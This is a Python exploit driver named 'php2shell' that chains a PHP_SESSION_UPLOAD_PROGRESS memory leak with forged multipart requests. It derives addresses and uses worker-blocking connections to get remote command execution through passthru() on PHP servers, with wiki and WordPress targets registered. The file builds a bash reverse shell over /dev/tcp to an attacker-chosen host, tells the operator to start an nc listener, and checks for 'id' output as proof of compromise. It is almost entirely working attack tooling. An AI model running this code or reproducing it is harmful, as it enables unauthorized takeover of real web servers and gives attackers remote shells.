#!/usr/bin/env python3

"""php2shell.py - chain driver. recon: fingerprint+arm+leak probe receipt; chain: blockers+rearm+forged multipart."""


import argparse
import hashlib
import importlib.util
import json
import re
import socket
import sys
import time
from pathlib import Path
from urllib.parse import urlsplit


HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE.parent))  # allow script-mode package imports

from tool.modules import profiles  # noqa: E402  (after HERE bootstrap)
from tool.modules import producer_fpmwiki as producer_stage  # noqa: E402
from tool.stages import probe as probe_stage  # noqa: E402


def load(name: str, path: Path):
    spec = importlib.util.spec_from_file_location(name, path)
    module = importlib.util.module_from_spec(spec)
    spec.loader.exec_module(module)
    return module


# Conserved module alias: the former native-output-leak.py now lives at
# tool/modules/arm.py (multipart PHP_SESSION_UPLOAD_PROGRESS builders +
# HTTP framing + disclosure analyzer).
LEAK = load("tool_arm", HERE / "modules" / "arm.py")

# STOCK/COMPACT ship as separate author-provided files in tool/modules/.
STOCK = None
COMPACT = None


def load_helpers() -> None:
    global STOCK, COMPACT
    missing = [
        name
        for name in (
            "native-output-leak-stock-arm.py",
            "compact-stock-tail.py",
        )
        if not (HERE / "modules" / name).exists()
    ]
    if missing:
        raise FileNotFoundError(
            "missing helper module(s) in tool/modules/: " + ", ".join(missing)
        )
    STOCK = load("native_output_stock_arm", HERE / "modules" / "native-output-leak-stock-arm.py")
    COMPACT = load("compact_stock_tail", HERE / "modules" / "compact-stock-tail.py")


BINARY_PROFILES = profiles.BINARY_PROFILES

PROFILE = dict(BINARY_PROFILES["ubuntu85-1.3-compact"])

ID_LINE = re.compile(
    rb"(?m)^uid=[0-9]+\([A-Za-z0-9_.-]+\) "
    rb"gid=[0-9]+\([A-Za-z0-9_.-]+\) groups=[^\r\n]+$"
)

# argv-driven stage list (receipt ladder order): producer -> chain; recon reads.
STAGES = ("recon", "producer", "chain")


def run_producer_step(
    host: str,
    port: int,
    host_header: str,
    body_bytes: int,
    output: Path,
    live: bool,
    timeout: float,
) -> tuple[dict, Path]:
    """Producer stage entrypoint: dry byte-build by default, --live to fire."""
    if live:
        summary = producer_stage.fire(host, port, body_bytes, output, timeout=timeout)
    else:
        summary = producer_stage.dry(host_header, body_bytes, output)
    summary["step"] = "producer"
    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
    (output / "result.json").write_text(rendered)
    return summary, output / "result.json"


def parse_url(value: str) -> tuple[str, int, str, str]:
    parsed = urlsplit(value)
    if parsed.scheme != "http" or parsed.username or parsed.password or parsed.fragment:
        raise ValueError("URL must be an uncredentialed HTTP URL without a fragment")
    if not parsed.hostname:
        raise ValueError("URL has no host")
    port = parsed.port or 80
    path = parsed.path or "/"
    if parsed.query:
        path += "?" + parsed.query
    path.encode("ascii")
    host_header = parsed.hostname if port == 80 else f"{parsed.hostname}:{port}"
    return parsed.hostname, port, path, host_header


def multipart_request(
    host_header: str,
    path: str,
    sid: bytes,
    boundary: bytes,
    body: bytes,
    keep_alive: bool,
) -> bytes:
    return (
        b"POST " + path.encode("ascii") + b" HTTP/1.1\r\n"
        + b"Host: " + host_header.encode("ascii") + b"\r\n"
        + (b"Connection: keep-alive\r\n" if keep_alive else b"Connection: close\r\n")
        + b"Cookie: PHPSESSID=" + sid + b"\r\n"
        + b"Content-Type: multipart/form-data; boundary=" + boundary + b"\r\n"
        + b"Content-Length: " + str(len(body)).encode("ascii") + b"\r\n\r\n"
        + body
    )


def open_exchange(host: str, port: int, request: bytes, timeout: float):
    connection = socket.create_connection((host, port), timeout=timeout)
    connection.settimeout(timeout)
    stream = connection.makefile("rb", buffering=0)
    connection.sendall(request)
    return connection, stream, LEAK.read_response(stream)


def exchange(host: str, port: int, request: bytes, timeout: float):
    connection = None
    try:
        connection, stream, result = open_exchange(host, port, request, timeout)
        return result, None
    except (ConnectionError, OSError, TimeoutError, ValueError) as error:
        return (b"", b"", {}, 0), f"{type(error).__name__}: {error}"
    finally:
        if connection is not None:
            connection.close()


def record(output: Path, label: str, request: bytes, result, error: str | None = None) -> dict:
    response, body, headers, status = result
    artifacts = {
        f"{label}-request.bin": request,
        f"{label}-response.bin": response,
        f"{label}-body.bin": body,
    }
    for name, data in artifacts.items():
        (output / name).write_bytes(data)
    item = {
        "status": status,
        "connection": headers.get("connection", ""),
        "body_bytes": len(body),
        "sha256": {name: hashlib.sha256(data).hexdigest() for name, data in artifacts.items()},
    }
    if error:
        item["error"] = error
    return item


def scan_disclosure(body: bytes, submitted: list[bytes]) -> dict | None:
    """Best-effort scan fallback: slide an 8-byte window across `body`.

    Full-page responses (e.g. the ~36k-byte wiki receipts) can carry the
    frozen-profile disclosure inline instead of being the 14-byte frame. The
    pointer semantics are NOT re-implemented here: LEAK.analyze is CALLed per
    candidate window and stays the sole arbiter of the candidate gate. A cheap
    canonical prefilter (byte5 high nibble == 7, bytes 6-7 == 0 — exactly
    analyze's 0x700000000000..0x7FFFFFFFFFFF range shape) skips windows that
    cannot match it, keeping the big-request membership scans sparse.
    """
    if len(body) < 8:
        return None
    for offset in range(0, len(body) - 7):
        window = body[offset:offset + 8]
        if window[6] != 0 or window[7] != 0 or window[5] & 0xF0 != 0x70:
            continue  # cannot be a canonical 0x00007f.. pointer
        disclosure = LEAK.analyze(window, submitted)
        if disclosure.get("candidate"):
            disclosure["window_offset"] = offset
            return disclosure
    return None


def derive(body: bytes, submitted: list[bytes], strict: bool = False) -> dict:
    """Address derivation from the leak-probe response body.

    exact mode (--strict-derive): the historical hard gate — the body must BE
    the 14-byte frozen-profile disclosure, else ValueError (verbatim message).
    default (2026-10-21 plan flip): best-effort —
      1. scan fallback: sliding 8-byte window over the body, LEAK.analyze keeps
         the candidate decision (scan_disclosure above);
      2. plain-response acceptance: with no disclosure anywhere in the body,
         return mode="plain" (no addresses) instead of raising; attempt() then
         passes forward the addresses already computed for an earlier ordinal.
    """
    analyzed = LEAK.analyze(body, submitted)
    if len(body) == 14 and analyzed.get("candidate"):
        mode, disclosure = "exact", analyzed
    elif strict:
        raise ValueError("response is not the exact 14-byte frozen-profile disclosure")
    else:
        disclosure = scan_disclosure(body, submitted)
        if disclosure is None:
            return {
                "mode": "plain",
                "disclosure": analyzed,
                "main": None,
                "target": None,
                "stage": None,
                "stage_delta": None,
                "dso_candidates": [],
                "note": "plain response: no frozen-profile disclosure (body "
                        f"sha256 {analyzed['body_sha256']}); pass prior addresses forward",
            }
        mode = "scan"
    main = int(disclosure["main_chunk"], 16)
    target = main + PROFILE["target_offset"]
    stage = main + PROFILE["stage_offset"]
    candidates = [main - delta for delta in PROFILE["dso_deltas"]]
    return {
        "mode": mode,
        "disclosure": disclosure,
        "main": f"0x{main:x}",
        "target": f"0x{target:x}",
        "stage": f"0x{stage:x}",
        "stage_delta": f"0x{stage - target:x}",
        "dso_candidates": [f"0x{candidate:x}" for candidate in candidates],
    }


def build_revshell(lhost: str, lport: int) -> str:
    try:
        addresses = {item[4][0] for item in socket.getaddrinfo(lhost, None)}
    except OSError:
        addresses = set()
    host = next(iter(addresses), lhost)
    # runs inside passthru() -> /bin/sh -c; exec keeps a single interactive bash
    return f"bash -c 'exec bash -i &>/dev/tcp/{host}/{lport}'"


def command_mode(command: str, lhost: str, lport: int) -> str:
    if command == "revshell":
        command = build_revshell(lhost, lport)
    return f"passthru-{command}"


def attempt(
    host: str,
    port: int,
    path: str,
    host_header: str,
    timeout: float,
    ordinal: int,
    output: Path,
    payload: str,
    prior: dict | None = None,
    strict: bool = False,
) -> dict:
    output.mkdir(parents=True, exist_ok=True)
    native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    native_arm_request = LEAK.request_bytes(
        host_header, path, native_arm_body, None, 23, False
    )
    native_arm_result, native_arm_error = exchange(
        host, port, native_arm_request, timeout
    )

    probe_body = LEAK.probe_body()
    probe_request = LEAK.request_bytes(host_header, path, probe_body, b"", 64, True)
    positive = None
    try:
        positive, positive_stream, probe_result = open_exchange(
            host, port, probe_request, timeout
        )
        address = derive(probe_result[1], [native_arm_request, probe_request], strict)
        if address.get("mode") == "plain":
            # plain-response acceptance: the attempt stage already computed
            # (main, target, stage_delta, dso) for a previous ordinal — pass
            # them forward instead of recomputing the derivation.
            if prior is None:
                raise ValueError(
                    "probe response is a plain response (no frozen-profile "
                    "disclosure) and no prior addresses were passed forward"
                )
            address = dict(prior)
            address["reuse_prior"] = True
        main = int(address["main"], 16)
        target = int(address["target"], 16)
        stage_delta = int(address["stage_delta"], 16)
        dso_base = main - PROFILE["dso_deltas"][ordinal]

        rearm_body = COMPACT.arm_body(False, COMPACT.ARM_FILENAME_LENGTH, 149)
        rearm_request = multipart_request(
            host_header,
            path,
            f"rearm{ordinal}a".encode("ascii"),
            COMPACT.BOUNDARY,
            rearm_body,
            False,
        )
        positive.sendall(rearm_request)
        rearm_result = LEAK.read_response(positive_stream)
    finally:
        if positive is not None:
            positive.close()

    final_body = COMPACT.probe_body(
        100,
        39,
        39,
        11,
        True,
        2,
        8000,
        6000,
        False,
        True,
        target,
        dso_base,
        stage_delta,
        1,
        payload,
    )
    final_request = multipart_request(
        host_header,
        path,
        f"rearm{ordinal}b".encode("ascii"),
        COMPACT.BOUNDARY,
        final_body,
        False,
    )
    final_result, final_error = exchange(host, port, final_request, timeout)
    match = ID_LINE.search(final_result[1])

    records = {
        "native_arm": record(
            output, "native-arm", native_arm_request, native_arm_result, native_arm_error
        ),
        "probe": record(output, "probe", probe_request, probe_result),
        "rearm": record(output, "rearm", rearm_request, rearm_result),
        "final": record(output, "final", final_request, final_result, final_error),
    }
    result = {
        "ordinal": ordinal,
        "dso_delta": f"0x{PROFILE['dso_deltas'][ordinal]:x}",
        "selected_dso": f"0x{dso_base:x}",
        "derive_mode": address.get("mode"),
        "addresses": address,
        "records": records,
        "id_line": match.group(0).decode("ascii") if match else None,
        "success": bool(match),
        "final_parts": 116,
    }
    rendered = json.dumps(result, indent=2, sort_keys=True) + "\n"
    (output / "result.json").write_text(rendered)
    return result


def run_recon(
    host: str,
    port: int,
    path: str,
    host_header: str,
    timeout: float,
    target_label: str,
    output: Path,
    strict: bool = False,
) -> dict:
    """recon step: pre-flight fingerprint, stock arm, leak probe, addresses."""
    load_helpers()
    output.mkdir(parents=True, exist_ok=True)
    summary: dict = {
        "step": "recon",
        "target": target_label,
        "host": host,
        "port": port,
        "path": path,
    }
    summary["preflight"] = probe_stage.fingerprint(host, port, host_header, path, timeout)
    if not summary["preflight"].get("alive"):
        summary["notes"] = "target not alive on this endpoint; arm/probe skipped"
        return summary

    native_arm_body = STOCK.arm_body(b"abcdefgh", COMPACT.ARM_FILENAME_LENGTH)
    native_arm_request = LEAK.request_bytes(host_header, path, native_arm_body, None, 23, False)
    native_arm_result, native_arm_error = exchange(host, port, native_arm_request, timeout)

    probe_request = LEAK.request_bytes(host_header, path, LEAK.probe_body(), b"", 64, True)
    probe_result, probe_error = exchange(host, port, probe_request, timeout)

    records: dict = {}

    def safe_record(label, request, result, error=None):
        if error is None:
            try:
                records[label] = record(output, label, request, result)
                return records[label]
            except (OSError, ValueError) as exc:
                error = f"{type(exc).__name__}: {exc}"
        records[label] = {"error": error}

    safe_record("native-arm", native_arm_request, native_arm_result, native_arm_error)
    safe_record("probe", probe_request, probe_result, probe_error)

    addresses = None
    if probe_error is None:
        try:
            addresses = derive(probe_result[1], [native_arm_request, probe_request], strict)
        except ValueError as error:
            addresses = {"error": str(error)}
    summary["addresses"] = addresses
    summary["records"] = records
    summary["arm_exchange_error"] = native_arm_error
    summary["probe_exchange_error"] = probe_error
    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
    (output / "result.json").write_text(rendered)
    return summary


def main() -> int:
    parser = argparse.ArgumentParser(
        description="php2shell chain driver: --step recon (read-only receipt), "
        "--step producer (fpmwiki producer: offline byte-build default, --live "
        "to fire), or --step chain (blocker-hold + rearm + forged staged multipart)"
    )
    parser.add_argument(
        "--target",
        default=None,
        help="registered target name (tool/modules/profiles.py: wiki, wp) "
        "or an http:// URL for a one-off exchange (legacy usage)",
    )
    parser.add_argument("--url", default=None, help="explicit target URL override")
    parser.add_argument("--step", required=True, choices=STAGES)
    parser.add_argument(
        "--profile",
        default=None,
        choices=tuple(BINARY_PROFILES),
        help="per-build constants; defaults to the target's bound profile",
    )
    parser.add_argument("--command", default="id", help="chain command payload (default: id)")
    parser.add_argument("--lhost", default="127.0.0.1")
    parser.add_argument("--lport", default=4444, type=int)
    parser.add_argument(
        "--output",
        type=Path,
        default=None,
        help="receipt directory; default files/io/<target>-<step>-<UTC stamp>",
    )
    parser.add_argument("--settle-seconds", default=8.0, type=float)
    parser.add_argument("--recovery-seconds", default=2.0, type=float)
    parser.add_argument("--timeout", default=120.0, type=float)
    # producer stage (--step producer): offline-first, dry is the default
    parser.add_argument(
        "--body-bytes",
        type=int,
        default=producer_stage.DEFAULT_BODY_BYTES,
        help="producer: wpTextbox1 'A'*N size, int N (5.7M anonymous-edit OOM "
        "receipt; ladder 5.7M-6.0M fatal, 9M past the post_max_size ceiling)",
    )
    live_group = parser.add_mutually_exclusive_group()
    live_group.add_argument(
        "--live",
        action="store_true",
        help="producer: actually send (default: build + record request bytes only)",
    )
    live_group.add_argument("--dry-run", action="store_true", help="default, accepted explicitly")
    live_group.add_argument("--build-only", action="store_true", help="alias of --dry-run")


    parser.add_argument(
        "--strict-derive",
        action="store_true",
        help="restore the historical exact gate: require the 14-byte "
        "frozen-profile disclosure verbatim (default: scan the response body "
        "for the disclosure window and reuse prior addresses on plain responses)",
    )
    args = parser.parse_args()

    target_name = args.target
    url = args.url
    if target_name is not None and target_name.startswith(("http://", "https://")):
        # legacy: the URL was passed as --target
        url = target_name
        target_name = None
    if target_name is not None and not profiles.is_known_target(target_name):
        parser.error(
            "--target must be one of " + ", ".join(profiles.TARGETS) + " or an http:// URL"
        )
    if url is None:
        url = profiles.url_for(target_name) if target_name else None
    if url is None:
        parser.error(
            "no target URL: pass a registered --target (with an http endpoint) or --url"
        )

    profile_name = args.profile
    if profile_name is None:
        try:
            profile_name = profiles.profile_for(target_name, url_target=(target_name is None))
        except ValueError as error:
            parser.error(str(error))

    try:
        host, port, path, host_header = parse_url(url)
    except ValueError as error:
        parser.error(str(error))

    if PROFILE["name"] != profile_name:
        PROFILE.clear()
        PROFILE.update(BINARY_PROFILES[profile_name])

    if not 0 <= args.settle_seconds <= 15:
        parser.error("settle interval must be between 0 and 15 seconds")
    if not 0 <= args.recovery_seconds <= 15:
        parser.error("recovery interval must be between 0 and 15 seconds")
    if not 1 <= args.lport <= 65535:
        parser.error("lport must be between 1 and 65535")

    if args.step == "producer":
        try:
            producer_stage.validate_body_bytes(args.body_bytes)
        except (TypeError, ValueError) as error:
            parser.error(f"--body-bytes: {error}")

    if args.output is None:
        stamp = time.strftime("%Y%m%dT%H%M%SZ", time.gmtime())
        args.output = HERE.parent / "files" / "io" / f"{target_name or 'adhoc'}-{args.step}-{stamp}"

    payload = None
    if args.step == "chain":
        payload = command_mode(args.command, args.lhost, args.lport)
        if args.command == "revshell":
            print(f"[i] payload command: {payload}")
            print(f"[i] start the listener first, e.g.: nc -lvnp {args.lport}")
        hold = (
            f"GET {path} HTTP/1.1\r\n"
            f"Host: {host_header}\r\n"
            "Connection: keep-alive\r\n"
            "X-Hold: "
        ).encode("ascii")

    if args.step == "recon":
        result = run_recon(
            host, port, path, host_header, args.timeout, target_name or url,
            args.output, strict=args.strict_derive,
        )
        summary = result
    elif args.step == "producer":
        try:
            summary, _receipt = run_producer_step(
                host, port, host_header, args.body_bytes, args.output,
                live=args.live, timeout=args.timeout,
            )
        except (ConnectionError, OSError, TimeoutError, ValueError) as error:
            summary = {
                "step": "producer",
                "host": host,
                "port": port,
                "path": path,
                "body_bytes": args.body_bytes,
                "error": f"{type(error).__name__}: {error}",
            }
            rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
            (args.output / "result.json").write_text(rendered)
            print(rendered, end="")
            return 2
    else:
        blockers = []
        attempts = []
        prior_addresses: dict | None = None
        try:
            for _ in range(PROFILE["blockers"]):
                connection = socket.create_connection((host, port), timeout=5)
                connection.settimeout(args.timeout)
                connection.sendall(hold)
                blockers.append(connection)
            time.sleep(args.settle_seconds)

            for ordinal in range(len(PROFILE["dso_deltas"])):
                try:
                    result = attempt(
                        host,
                        port,
                        path,
                        host_header,
                        args.timeout,
                        ordinal,
                        args.output / f"candidate-{ordinal}",
                        payload,
                        prior=prior_addresses,
                        strict=args.strict_derive,
                    )
                except (ConnectionError, OSError, TimeoutError, ValueError) as error:
                    result = {
                        "ordinal": ordinal,
                        "success": False,
                        "error": f"{type(error).__name__}: {error}",
                    }
                attempts.append(result)
                derived = result.get("addresses")
                if derived and derived.get("mode") in ("exact", "scan"):
                    prior_addresses = derived
                if result.get("success"):
                    break
                time.sleep(args.recovery_seconds)
        finally:
            for connection in blockers:
                connection.close()

        success = next((item for item in attempts if item.get("success")), None)
        summary = {
            "step": "chain",
            "profile": PROFILE,
            "target": {"url": url, "host": host, "port": port, "path": path},
            "command": args.command,
            "lhost": args.lhost,
            "lport": args.lport,
            "payload": payload,
            "blockers_opened": len(blockers),
            "attempts": attempts,
            "success": bool(success),
            "id_line": success.get("id_line") if success else None,
            "successful_candidate": success.get("ordinal") if success else None,
        }
        rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
        (args.output / "result.json").write_text(rendered)
        if success:
            print(success["id_line"])
        else:
            print("RCE proof failed")
        return 0 if success else 2

    rendered = json.dumps(summary, indent=2, sort_keys=True) + "\n"
    (args.output / "result.json").write_text(rendered)
    print(rendered, end="")
    if args.step == "producer":
        # producer dry build: 0 = recorded; 2 = over the post_max_size ceiling
        # (byte templates are still recorded, but --live would refuse to send)
        return 2 if summary.get("over_budget") else 0
    # recon exit code: 0 = worker responded with a parseable HTTP exchange;
    # arm/probe field-level outcomes live in the receipt for human review.
    return 0 if summary.get("preflight", {}).get("alive") else 2


if __name__ == "__main__":
    raise SystemExit(main())
